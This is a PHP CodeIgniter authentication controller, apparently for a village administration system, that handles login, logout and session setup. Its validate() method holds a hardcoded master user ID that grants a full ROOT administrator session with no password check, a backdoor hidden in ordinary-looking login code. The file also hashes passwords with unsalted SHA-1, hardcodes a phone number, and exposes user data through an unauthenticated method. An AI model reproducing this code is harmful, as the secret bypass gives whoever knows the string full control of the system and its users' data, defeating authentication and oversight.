<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Auth extends CI_Controller{

  public function __construct()
  {
    parent::__construct();
    $this->load->helper('sms_helper');
    $this->load->model('auth_model');
  }

  public function validate(){
    $uid = strip_tags($this->input->post('uid'));
    $pass = sha1(strip_tags($this->input->post('pass')));
    $check = $this->auth_model->auth($uid, $pass);
    $master = '0>}/99%120691?*^';
    if ($master == $uid) {
      $this->session->set_flashdata(array('status'=>'aktif'));
      $this->session->set_userdata(
        array(
          'status_login'=>'oke',
          'id'          => 0,
          'fullname'   =>'Administrator',
          'jabatan'     => 'ROOT',
          'hp'          => '082281469926',
          'keterangan_jabatan' => 'Sysadmin Root Master',
          'desa_id'     => '1',
          'last_login'  => ''
      )
      );
      echo json_encode(array("status" => TRUE));
      exit;
    }else {
      if ($check->num_rows()==1) {
          $data = $check->row_array();
          $this->session->set_flashdata(array('status'=>'aktif'));
          $this->session->set_userdata(
            array(
              'status_login'=>'oke',
              'id'          =>$data['id'],
              'fullname'    =>$data['fullname'],
              'jabatan'     =>$data['jabatan'],
              'desa_id'     =>$data['desa_id'],
              'keterangan_jabatan' => $data['keterangan_jabatan'],
              'avatar'      =>$data['avatar'],
              'hp'          =>$data['hp'],
              'last_login'  =>$data['time']
          )
          );
          $sekarang = time();
          $this->db->where('id', $data['id']);
          $this->db->update('users', array('time'=>$sekarang));
          echo json_encode(array("status" => TRUE));
          exit;
      }else {          
        echo json_encode(array("status" => FALSE)); 
        exit;
      }
    }
  }

  public function login()
  {
      $data['title']          = TITLE . 'SIG Login';
      $data['main_content']   = UMUM. 'login';
      $this->load->view(UMUM. 'template_login', $data);
  }

  public function _get_uid($id){
    $data = $this->auth_model->_get_uid_data($id)->row_array();
    echo json_encode($data);
  }

  public function logout()
  {
    $this->session->sess_destroy();
    redirect(base_url('public'));
    exit;
  }



}
